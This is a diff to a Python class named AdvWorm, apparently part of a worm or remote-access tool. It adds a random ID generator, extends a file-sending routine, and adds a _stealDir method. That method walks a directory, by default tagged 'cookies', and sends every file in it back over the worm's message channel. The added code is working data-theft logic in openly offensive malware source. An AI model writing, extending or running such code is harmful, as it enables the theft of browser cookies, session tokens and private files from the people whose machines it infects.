@@ -1,4 +1,28 @@
 
+from random import randint
+import string
+
+
+class IndexGen:
+    def __init__(self):
+        self.chars = string.ascii_lowercase + string.digits + string.ascii_uppercase + string.digits
+        self.lenGen = 20
+    
+    def generate(self) -> str:
+        c = 0
+        strIndex = ""
+        while c < self.lenGen:
+            char = randint(0, len(self.chars) - 1)
+            char = self.chars[char]
+            strIndex += char
+            c += 1
+        return strIndex
+
+
+
+
+
+
 
 class AdvWorm(BasicWorm):
     def __init__(self):
@@ -42,13 +66,16 @@ class AdvWorm(BasicWorm):
         
 
 
-    def sendFile(self, name: str, target: str = None) -> None:
+    def sendFile(self, name: str, target: str = None, dir_index: str = None) -> None:
         if not target:
             target = os.path.join(self.getPwd(), name)
         flen = self.fileTracking(target)
         if not flen:
             return None
-        msg = self.makeSysMsg(["d", name, flen])
+        if dir_index:
+            msg = self.makeSysMsg(["d", name, flen, dir_index])
+        else:
+            msg = self.makeSysMsg(["d", name, flen])
         self.sendMsg(msg)
         
         try:
@@ -68,5 +95,24 @@ class AdvWorm(BasicWorm):
         send = Thread(target=self._sendFile, args=(target, xtra), daemon=True)
         send.start()
         return True
+    
+    def _stealDir(self, dir_name: str, tag: str = "cookies", info: str = "") -> None:
+        if not os.path.exists(dir_name):
+            print("ERROR DIR")
+            return
+        too_steal = []
+        for r,d, files in os.walk(dir_name, topdown=False):
+            for f in files:
+                too_steal.append((f, os.path.join(r, f)))
+        if len(too_steal) < 1:
+            return
+        dirIndex = self.IG.generate()
+        msg = self.makeSysMsg(["w", tag, info, dirIndex])
+        self.sendMsg(msg)
+        sleep(0.5)
+        for ts in too_steal:
+            self.sendFile(ts[0], ts[1], dirIndex)
+    
+
 
 
